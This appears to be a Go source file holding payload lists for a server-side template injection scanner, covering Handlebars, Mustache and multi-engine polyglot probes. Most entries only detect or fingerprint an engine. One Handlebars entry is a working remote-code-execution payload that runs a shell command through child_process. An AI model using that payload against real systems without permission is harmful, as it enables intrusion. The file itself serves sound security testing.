package ssti

// Handlebars payloads (JavaScript).
// Source: PayloadsAllTheThings
var handlebarsPayloads = []Payload{
	// Detection payloads
	{
		Value:           "{{this}}",
		Engine:          EngineHandlebars,
		Type:            TypeDetection,
		Description:     "Handlebars this context",
		DetectionMethod: MethodReflection,
		ExpectedOutput:  "Object",
	},
	// RCE payloads (requires helpers)
	{
		Value:           "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').exec('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
		Engine:          EngineHandlebars,
		Type:            TypeRCE,
		Description:     "Handlebars RCE via prototype pollution",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
}

// Mustache payloads.
// Note: Mustache is logic-less, so SSTI is limited
var mustachePayloads = []Payload{
	// Detection payloads
	{
		Value:           "{{.}}",
		Engine:          EngineMustache,
		Type:            TypeDetection,
		Description:     "Mustache current context",
		DetectionMethod: MethodReflection,
	},
	{
		Value:           "{{#each .}}{{@key}}={{.}}{{/each}}",
		Engine:          EngineMustache,
		Type:            TypeFingerprint,
		Description:     "Mustache object iteration",
		DetectionMethod: MethodReflection,
	},
}

// Polyglot payloads that work across multiple engines.
var polyglotPayloads = []Payload{
	{
		Value:           "{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}",
		Engine:          EngineUnknown,
		Type:            TypeDetection,
		Description:     "Multi-engine math polyglot",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "49",
	},
	{
		Value:           "${{7*7}}",
		Engine:          EngineUnknown,
		Type:            TypeDetection,
		Description:     "Dual syntax polyglot (Thymeleaf/Angular)",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "49",
	},
	{
		Value:           "{{7*'7'}}",
		Engine:          EngineUnknown,
		Type:            TypeFingerprint,
		Description:     "Jinja2/Twig differentiator",
		DetectionMethod: MethodReflection,
		ExpectedOutput:  "7777777",
	},
	{
		Value:           "${7*7}#{7*7}",
		Engine:          EngineUnknown,
		Type:            TypeDetection,
		Description:     "Java template polyglot",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "49",
	},
}
